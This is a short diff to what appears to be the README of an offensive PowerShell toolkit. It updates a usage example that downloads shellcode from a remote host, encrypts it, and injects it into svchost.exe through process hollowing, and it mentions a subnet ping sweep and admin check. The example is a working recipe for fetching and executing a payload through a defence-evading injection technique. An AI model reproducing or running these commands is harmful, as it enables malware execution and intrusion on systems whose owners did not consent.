@@ -19,8 +19,8 @@ Import-Module -Assembly $a
 
 Example of remotely loading and encrypting shellcode, then performing proc hollow with it
 ```powershell
-$r = Invoke-EncryptShellcode -shellcode $(IWR -Uri 'http://ip/shellcode.bin' -usebasicparsing).Content
-Invoke-ProcessHollow -procName 'svchost.exe' -k $r.encryptedKey -encsh $r.encryptedshellcode -ivk $.initVector
+$code = Invoke-EncryptShellcode -shellcode $(IWR -Uri 'http://ip/shellcode.bin' -usebasicparsing).Content
+INVPH -encsh $code.encryptedShellcode -k $code.encryptionKey -ivk $code.initVectorKey -pn 'svchost.exe' -Verbose
 ```
 Example of performing ping sweep then admin check on subnet
 ```powershell
